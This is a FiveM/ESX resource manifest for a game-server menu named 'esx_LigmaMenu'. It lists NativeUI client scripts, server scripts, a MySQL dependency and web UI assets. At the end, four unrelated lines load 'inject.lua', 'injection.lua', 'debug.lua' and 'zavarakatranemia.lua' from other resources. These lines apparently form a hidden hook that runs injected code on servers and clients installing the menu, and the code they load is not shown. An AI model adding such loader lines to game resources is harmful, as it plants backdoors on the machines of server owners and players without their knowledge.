resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

description 'esx_LigmaMenu'

version '1.2.0'

server_scripts {
  "@mysql-async/lib/MySQL.lua",
  "config.lua",
  "server.lua"
}


client_scripts {
  "NativeUI/UIMenu/UIMenu.lua",
  "NativeUI/UIMenu/MenuPool.lua",
  "NativeUI/Wrapper/Utility.lua",
  "NativeUI.lua",
  "NativeUI/UIElements/Sprite.lua",
  "NativeUI/UIElements/UIResText.lua",
  "NativeUI/UIElements/UIResRectangle.lua",
  "NativeUI/UIElements/UIVisual.lua",
  "NativeUI/UIMenu/elements/Badge.lua",
  "NativeUI/UIMenu/elements/Colours.lua",
  "NativeUI/UIMenu/elements/ColoursPanel.lua",
  "NativeUI/UIMenu/elements/StringMeasurer.lua",
  "NativeUI/UIMenu/items/UIMenuItem.lua",
  "NativeUI/UIMenu/items/UIMenuListItem.lua",
  "NativeUI/UIMenu/items/UIMenuColouredItem.lua",
  "NativeUI/UIMenu/windows/UIMenuHeritageWindow.lua",
  "NativeUI/UIMenu/panels/UIMenuColourPanel.lua",
  "client.lua",
  
}


dependencies {
  'es_extended',
}
 

ui_page 'index.html'

files {
  'index.html',
  'assets/js/jquery.min.js',
  'assets/js/main.js',
  'assets/css/Navigation-Clean.css',
  'assets/css/Navigation-with-Button.css',
  'assets/css/Navigation-with-Search.css',
  'assets/css/styles.css',
  'assets/bootstrap/js/bootstrap.min.js',
  'assets/bootstrap/css/bootstrap.min.css',
}


client_script '@esx_ligmanticheat/client/inject.lua'

client_script 'zavarakatranemia.lua'
server_script "@Protector/Server/injection.lua"

client_script '@esx_libraries/client/debug.lua'